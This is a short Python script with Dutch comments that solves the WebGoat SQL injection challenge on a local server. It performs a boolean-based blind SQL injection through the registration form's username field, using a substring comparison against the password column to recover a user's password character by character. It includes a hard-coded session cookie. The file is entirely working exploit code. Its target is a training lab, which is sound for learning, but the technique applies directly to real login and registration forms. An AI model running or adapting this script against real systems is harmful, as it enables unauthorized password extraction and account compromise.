#!/usr/bin/env python3

import requests

url = 'http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/challenge'

headers = {
    'Cookie': 'JSESSIONID=USKoKRQVl6jfr-o8i9q8eRrI37xRCL80HWMgaOyl; language=en; welcomebanner_status=dismiss'
}

gevonden_wachtwoord = ''


def send_request(payload, letter):
    global charset, gevonden_wachtwoord, index, length, kraken
    data = {
        'username_reg': payload,
        'email_reg': 'TestKees@han.nl',
        'password_reg': '12345',
        'confirm_password_reg': '12345'
    }

    res = requests.put(url, headers=headers, data=data).json()['feedback']
    print(gevonden_wachtwoord + letter, end='\r')
    if 'already exists' in res:
        kraken = True
        index += 1
        gevonden_wachtwoord += letter
        length = len(charset) # Er is een letter gevonden, opnieuw lengte instellen

    if 'please proceed' in res:
        length -= 1
        if length <= 0:
            kraken = False # Een keer extra door de characterset itereren, daarna stoppen.


charset = 'abcdefghijklmnopqrstuvwxyz'
length = len(charset)
index = 1
current_char = ''
kraken = True

while kraken:
    # print(running, end='\n')
    for letter in charset:
        current_char = letter
        payload = f"tom' AND substring(password,{index}, 1) ='{current_char}"
        send_request(payload, letter)

print('Het volgende wachtwoord is gevonden: ', gevonden_wachtwoord)
